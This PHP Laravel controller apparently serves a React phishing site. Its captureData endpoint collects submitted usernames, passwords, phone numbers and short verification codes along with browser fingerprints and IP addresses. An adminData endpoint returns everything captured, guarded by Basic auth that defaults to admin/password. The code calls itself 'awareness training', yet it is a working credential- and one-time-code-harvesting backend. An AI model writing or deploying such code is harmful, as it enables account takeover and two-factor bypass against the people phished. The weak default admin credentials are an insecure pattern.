<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Response;

class ReactController extends Controller
{
    /**
     * Serve the React application
     */
    public function index()
    {
        return view('app');
    }

    /**
     * Handle all routes and serve React app (SPA routing)
     */
    public function catchAll()
    {
        return view('app');
    }

    /**
     * API endpoint to capture phishing data
     */
    public function captureData(Request $request)
    {
        $data = $request->validate([
            'username' => 'sometimes|string|max:255',
            'password' => 'sometimes|string|max:255',
            'phoneNumber' => 'sometimes|string|max:20',
            'code' => 'sometimes|string|max:10',
            'timestamp' => 'sometimes|string',
            'userAgent' => 'sometimes|string',
            'screenResolution' => 'sometimes|string',
            'timeZone' => 'sometimes|string',
            'language' => 'sometimes|string',
            'referrer' => 'sometimes|string',
            'sessionId' => 'sometimes|string',
        ]);

        // Add server-side data
        $data['ip_address'] = $request->ip();
        $data['server_timestamp'] = now()->toISOString();
        
        // Store in session or database
        session()->push('captured_data', $data);
        
        // Log for admin review (be careful with sensitive data in production)
        \Log::info('Phishing awareness data captured', [
            'ip' => $request->ip(),
            'user_agent' => $request->userAgent(),
            'timestamp' => now()
        ]);

        return response()->json([
            'success' => true,
            'message' => 'Data captured for awareness training'
        ]);
    }

    /**
     * Admin endpoint to view captured data
     */
    public function adminData(Request $request)
    {
        // Simple admin authentication (enhance for production)
        $adminUsername = env('VITE_ADMIN_USERNAME', 'admin');
        $adminPassword = env('VITE_ADMIN_PASSWORD', 'password');
        
        $auth = $request->header('Authorization');
        if (!$auth || !$this->validateBasicAuth($auth, $adminUsername, $adminPassword)) {
            return response()->json(['error' => 'Unauthorized'], 401);
        }

        $capturedData = session('captured_data', []);
        
        return response()->json([
            'data' => $capturedData,
            'total' => count($capturedData)
        ]);
    }

    private function validateBasicAuth($auth, $username, $password)
    {
        if (strpos($auth, 'Basic ') !== 0) {
            return false;
        }
        
        $encoded = substr($auth, 6);
        $decoded = base64_decode($encoded);
        list($user, $pass) = explode(':', $decoded, 2);
        
        return $user === $username && $pass === $password;
    }
}
